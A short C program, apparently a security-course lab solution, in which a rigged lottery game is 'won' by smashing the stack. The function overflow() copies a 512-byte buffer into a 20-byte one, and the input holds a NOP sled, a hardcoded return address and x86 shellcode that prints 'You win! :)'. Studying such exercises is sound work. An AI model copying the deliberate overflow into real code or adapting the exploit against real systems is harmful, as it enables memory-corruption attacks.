/* lottery.c */

#include <stdio.h>    /* for printf() */
#include <stdlib.h>   /* for rand() and srand() */
#include <sys/time.h> /* for gettimeofday() */
#include <string.h>

char code[]=
"\xeb\x19\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04"
"\xb2\x0c\x59\xb3\x01\xcd\x80\x31\xc0\xb0\x01"
"\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff"
"\x59\x6f\x75\x20\x77\x69\x6e\x21\x20\x3a\x29\x0a"
;   
int your_fcn()
{
  char buffer[512];

  memset(buffer, 0x90, 512);

  strcpy(buffer, "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x14\xf3\xff\xbf");
  strcpy(buffer + 100, code);

  overflow(buffer);

  return 1;
}

int overflow(char* str){
  char buffer[20];
  strcpy(buffer, str);
  return 1;
}

int main()
{
    /* Seed the random number generator */
    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec);

    const char *sad = ":(";
    const char *happy = ":)";
    int rv;
    rv = your_fcn();

    /* Lottery time */
    if(rv != rand())
        printf("You lose %s\n", sad);
    else
        printf("You win! %s\n", happy);

    return EXIT_SUCCESS;
}
